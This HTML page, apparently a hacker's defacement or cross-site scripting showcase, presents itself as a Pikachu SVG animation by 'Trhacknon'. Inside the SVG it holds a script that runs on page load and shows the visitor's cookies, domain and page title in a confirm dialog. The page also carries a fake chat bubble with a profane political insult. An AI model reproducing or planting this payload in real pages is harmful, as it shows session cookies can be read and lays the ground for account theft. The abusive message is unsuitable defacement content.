...
<head>
  <meta charset="UTF-8">
  <title>
  Pikachu - SVG Animation By Trhacknon</title>
  <link rel="stylesheet" href="./style.css">
  <link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Roboto:400,700,300'>
  <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.1.2/css/material-design-iconic-font.min.css'>
  <link rel='stylesheet' href='https://rawgit.com/marvelapp/devices.css/master/assets/devices.min.css'><link rel="stylesheet" href="./pika.css">
</head>
<body>
...
<div class="wrapper">
  ...
  <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
   viewBox="0 0 185.8 186.3" style="enable-background:new 0 0 185.8 186.3;" xml:space="preserve" class="circle">
    ...
    <script>confirm(`PIKA-PIKA\n%F0%9F%8F%B4Trhacknon%F0%9F%8F%B4\n\n%E2%9C%93COOKIE\n${document.cookie}\n%E2%9C%93DOMAIN\n${document.domain}\n%E2%9C%93TITRE\n${document.title}\n`)</script>
  </svg>
</div>
<!-- partial -->
<!-- partial:index.partial.html -->
        ...
        <div class="chat">
          <div class="chat-container">
            <div class="user-bar">
              ...
              <div class="avatar">
                <img src="https://j.top4top.io/p_3088t8beq0.png" alt="Avatar">
              </div>
              <div class="name">
                <span>trhacknon</span>
            ...
            <div class="conversation">
              <div class="conversation-container">
                ...
                <div class="message received">
                  <span id="random">PUTIN FCK YOUR ***!"</span>
                  <span class="metadata"><span class="time"></span></span>
                </div>
              </div>
